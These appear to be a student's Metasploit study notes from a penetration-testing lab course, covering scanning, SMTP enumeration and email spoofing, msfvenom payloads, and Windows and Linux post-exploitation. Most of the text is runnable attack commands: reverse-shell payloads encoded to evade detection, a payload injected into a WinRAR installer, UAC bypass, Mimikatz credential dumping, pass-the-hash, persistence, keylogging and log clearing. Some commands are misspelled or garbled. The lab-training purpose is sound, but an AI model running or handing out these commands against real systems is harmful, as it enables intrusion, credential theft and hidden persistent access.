<h1>Metasploit Fundamentals</h1>

Initialisation of database
```
sudo systemctl start postgresql
```

```
sudo msfdb init
sudo msfdb reinit
sudo msfdb status
```
In meterpreter
```
search type:exploits platform:windows
```

```
workspace -h
hosts
workspace -a Testspace
workspace
hosts
workspace default
workspace -d Testspace
workspace -a Moew
workspace -r Moew Meow
```

<h2>T1046:Network Service Scanning </h2>
```
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

```
shell
ip addr
```

```
run autoroute -s <attackerIP>
```

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

```
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

bash-port-scanner.sh
```
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

```
sessions -i 1
```

```
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

we have uploaded nmap and our bash-port-scanner.sh to run in the target machine.

<h2>FTP</h2>
To perform file brute-force attacks on the web server?
```
auxililary/scanner/http/files_dir
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ftp/anonymous
```

<h2>SQL</h2>
 MySQL auxiliary module can be used to execute authenticated SQL queries on a MySQL database server?
 ```
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_writable_dirs
 ```

<h2>SMTP</h2>
```
nmap -sV -script banner demo.ine.local
```

```
nc demo.ine.local 25
```
```
VRFY admin@openmailbox.xyz
```

```
telnet demo.ine.local 25
HELO attacker.xyz
EHLO attacker.xyz
```

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```

```
msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit
```

```
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```



MSFconsole search queries can be used to search for specific CVE's released in a specific year?
```
search cve:2017 platform:windows
```

<h1>Vulnerability Scanning</h1>
<h2>MSF</h2>

```
sudo service postgresql start && msfconsole
workspace -a nmap
db_nmap -Pn -sS -sV -O demo.ine.local
hosts
services
search type:exploit name: 
analyse
vulns
load db_autopwn
```

<h2> Nessus </h2>

<h2>WMAP</h2>
```
wmap_sites -a demo.ine.local
wmap_targets -h
wmap_targets -t http://demo.ine.local
wmap_sites -l
wmap_targets -l
wmap_run -h
wmap_run -t

```

<h1>Client-Side attacks</h1>
<h2>Msfvenom</h2>
```
msfvenom --list payloads
```

```
	<operatingSystem>/<OsArchitectureBit>/<PayloadType>/<Protocol>
```

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > /home/kali/meow.exe
```

```
msfvenom --list formats
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /home/kali/meow_x86
```

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /home/kali/meow_x64
```

```
msfconsole
use exploit/multi/handler
show options
set payload 
set LHOST
set LPORT
```

<h2>ENCODING </h2>
`shellcode` is a piece of code that is typically used as a payload for exploitation


```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe > /home/kali/enocde/meowEncodeed.exe
```

increasing iterations will reduce the chances of detection

```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/enocde/meowEncodeed.exe
```

```
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/ecode/meow
```

Windows portable executable 

google: winrar and download it /Download/winrar.exe

generate a 32 bit executable payload and inject it into winrar

```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > /home/kali/enocde/meowEncodeed.exe
```
this file above is not executable
	Migrate : meterpreter> run post/windows/manager/migrate
to avoid detection

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > /home/kali/enocde/meowEncodeed.exe
```
this file above is executable

<h2>Automation</h2> of commands in msfconsole

```
vim handler.rc
`
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 
set LPORT 
run
`
msfconsole -r handler.rc
```

```
vim portscanner.rc
`
use auxiliary/scanner/portscan/tcp
set RHOST
set LHOST
run
`
```

```
vim db_status.rc
`
db_status
workspace 
workspace -a Meow
`
```

to Load resource into mf6>
```
resouce hanler.rc
```

to Explort the previously typed commands in msf6
```
makerc /meowmeoew/meow.rc
```

<h2>WinRm</h2>
<i>Port Number: 5985 TCP 5986 https</i>
```
use auxiliary/scanner/winrm/winrm_wql
setg RHOSTS 

use auxiliary/scanner/winrm/winrm_login
set USER_FILE
set PASS_FILE

use auxiliary/scanner/winrm/winrm_cmd
set USERNAME
set PASSWORD
set CMD

use auxiliary/scanner/winrm/winrm_script_exec
set USERNAME
set PASSWORD
set FORCE_VBS true
```

<h2>Post Exploitation Fundamentals</h2>
Privilege Escalation
Maintaining Persistent Access
Clearing Tracks

Penetration Testing Execution Standard

<h2>Upgrading Shell to meterpreter</h2>

```
search type:exploit samba
use exploit/linux/samba/is_known_pipename
set RHOSTS ><
set RPORT <>
run
background
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION <>
set LHOST <>
run

or 
background
sessions
sessions -u <session id>


```

<h1>Windows Post Exploitation</h1>

The basic command for privilege escalation.
```
getsystem
```
```
getprivs
```
```
getuid
output = NT AUTHORITY\LOCAL SERVICE
	if(output == NT AUTHORITY) {
	means : The highest privilege of a system 
		if(output == LOCAL SERVICE) {
		means : The highest privilege associated to the service used to exploit.
		}
	}
```

```
shell
net users
net localgroup administrators
Crtl+C
```

```

```

after exploitation using metasploit there is session generated  use command "sessions" to get running session.

use command "background" to get back into metasploit.

```
use post/windows/gather/win_privs
set SESSION 1
run
```
which can be used to automate the enumeration of the current user privileges.

```
use post/windows/gather/enum_applications
set SESSION 1
run
```
This module enumerates a list of installed application programs on the target system.

```
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```
Enumerates a list of currently and previous logged on users.

```
use post/windows/gather/checkvm
set SESSION 1
run
```
This module will tell you whether the target system is a VM or Container.

```
use post/windows/gather/enum_computers
set SESSION 1
run
```
Enumerate a list of computers connected to the same LAN that the target is a part of .

```
use post/windows/gather/enum_shares
set SESSION 1
run
```
Enumerate a list of shares by using the enum_shares module.

<h3><b><i> Bypassing UAC </i></b></h3>
UAC - User Account Control can be bypass why "In Memory Injection"
This will spawn a second shell that has UAC flag OFF.

```
getuid
sysinfo
```
Output: Victim/==admin==
```
ps -S explorer.exe
migrate <id>
getsystem
```

We need to check if the ==admin== user is a member of Administrator group.
```
shell
net localgroup administrators
```
if you find admin user as a member then it is possible:
`background to metasploit`

```
search bypassuac
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
show options
set LPORT
set LHOST
set TARGET
run
```


```
hashdump
```
Which one of the following Windows commands can be used to enumerate members of the "Administrators" group?
`net localgroup administrator`

<h3><b><i> Token Impersonation with Incognito</i></b></h3>
it is a core element for authentication managed by Local Security Authority Subsystem Service(LSASS).
Access Tokens are generated by winlogon.exe every time a user is authenticated successfully.

> Impersonate Level Token: THREAT to that local system only. created through interactive actions.
> Delegate Level Token: Large THREAT can impersonate on any system. created thorugh windows login or RDP.

This privilege escalation primarily depend on the privileges assigned to the account in our control as well as Impersonate Level Token or Delegate Level Token.

>SeAssignPrimaryToken:
>SeCreateToken:
>SeImpersonatePrivilege:

Incognito module built-in metasploit used to display a list of avaliabe token in the exploited machine.

```
sysinfo
getuid       
getprivs
load incognito
list_tokens -u
	output:
		Delegate Tokens Avaliable:
		meow\Administrator
		Impersonation Tokens Availabe:

impersonate_token "meow\Administrator"
ps
migrate <explorer_id>
hashdump
```

migration is required as the service we are using to execute commands has privilege as \LOCAL SERVICE which restricts hashdump.

Windows Access Tokens are generated by the winlogon.exe process. FALSE.

Impersonate tokens are created as a direct result of an interactive login on Windows. FALSE

<h3><b><i> Mimikatz </i></b></h3>
Mimikatz allows for the extraction of plain text credentials from local SAM databases and more.

Which one of the following meterpreter Kiwi commands can be used to dump the contents of the SAM database? lsa_dump_sam


```
	use exploit/windows/badblue_passthru
	set TARGET BadBlue\ EE\ 2.7
```

```
sysinfo
getuid
ps
pgrep lsass
migrate 792
sysinfo
```

```
load kiwi
creds_all //dump all creds
lsa_dump_samtemke
lsa_dump_secrets  //syskey


upload /usr/share/mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

<h3><b><i> Pass-the-Hash with PSExec </i></b></h3>

This required user credentials from hashdump
```
search psexec
use exploit/windows/smb/psexec
setg RHOSTS 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set SMBPass <theHash> 
set SMBUser 
exploit

```

```
systeminfo
getuid

```

<h3><b><i> Establish Persistence in Windows</i></b></h3>
```
search platform:windows persistence
use exploit/windows/local/persistence_service
set PAYLOAD windows/meterpreter/reverse_tcp
set SESSION 

```

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST eth1
run
```

The LPORT must be the same in multi/handler and windows persistence

<h3><b><i> Enabling RDP </i></b></h3>
Remote Desktop Protocol
```
use post/windowes/manage/enable_rdp
set ENABLE ture
set SESSION 1
exploit

```

```
net user administrator hacker_12321 //this is changing password 
```

```
xfreerdp /u:administrator /p:hacker12321 /v:192.1.1.1
```

<h3><b><i> Keylogging</i></b></h3>
after gaining a meterpreter shell 
```
keyscan_start  // sniffing keystrocks on attacker machine
keyscan_dump  // get what keys the victim typed till now
keyscan_stop

```

<h3><b><i> Clearing Windows Event Logs </i></b></h3>
```
clearev
```

<h3><b><i> Pivoting </i></b></h3>
```
ipconfig //to find victim-2IP
run autoroute -s <OtherInterfaceIPwith/mask>
```

```
sessions
sessions -n victim-1 -i 1
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS victim-2IP
set RPORT 1-100
run
```

```
sessions 1
portfwd add -l 1234 -p 80 -r victim-2IP
```

```
db_nmap -sS -sV -p 1234 localhost
```

```
search badblue_passthru 
set payload windows/meterpreter/bind_tcp
show options 
set RHOSTS victim-2IP
run
```


<h2>Linux Post Exploitation</h2>

```
use exploit/linux/samba/is_known_pipename
show options
set RHOSTS 
set RPORT
run
```

```
sessions -u 1 //upgrade session to meterpreter
```

```
uname -r
uname -a
ps aux
env
```

```
search enum_configs
```

```
use post/multi/gather/env
set SESSION 
```

```
use post/linux/gather/enum_network
set SESSION 
```

```
loot
```

```
use post/linux/gather/enum_protections
```

```
notes
```

```
use post/linux/gather/enum_system
use post/linux/gather/checkcontainer
use post/linux/gather/checkvm
```

- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec

after gaining meterpreter get a shell /bin/bash -i

<h3><b><i> Privilege Escalation - Rootkit Scanner </i></b></h3>

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit
```


```
ps aux
cat /bin/check-down
chkrootkit --help
```
Observe, that there are a couple of processes running i.e. cron and one bash script.


```
search chkrootkit
use exploit/unix/local/chkrootkit
set CHKROOTKIT <path-in-/bin/check-down>
```

<h3><b><i> Hashdump </i></b></h3>

```
use post/linux/gather/hashdump
set SESSION 
run
```

```
loot
```

```
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST demo.ine.local
check
exploit -z
```

```
use post/multi/gather/ssh_creds
set SESSION 1
run
```

```
use post/multi/gather/docker_creds
set SESSION 1
run
```

```
use post/linux/gather/hashdump
set SESSION 1
set VERBOSE true
run
```

```
use post/linux/gather/ecryptfs_creds
set SESSION 1
run
```

```
use post/linux/gather/enum_psk
set SESSION 1
run
```

```
use post/linux/gather/enum_xchat
set SESSION 1
set XCHAT true
run
```

```
use post/linux/gather/phpmyadmin_credsteal
set SESSION 1
run
```

```
use post/linux/gather/pptpd_chap_secrets
set SESSION 1
run
```

```
use post/linux/manage/sshkey_persistence
set SESSION 1
run
```

<h3><b><i> Establishing Persistence On Linux </i></b></h3>
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit
```

```
sessions -u 1
```

```
use exploit/unix/local/chkrootkit
```

```
set SESSION 2
```

```
set CHKROOTKIT /bin/chkrootkit
```

```
exploit
```

```
sessions -u 3
```

```
use post/linux/manage/sshkey_persistence
```

```
set SESSION 4
```

```
set CREATESSHFOLDER true
```

```
exploit
```

```
cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key
```

```
chmod 0400 ssh_key
```

```
ssh -i ssh_key root@demo.ine.local
```

<h2>Armitage Metasploit GUIs</h2>
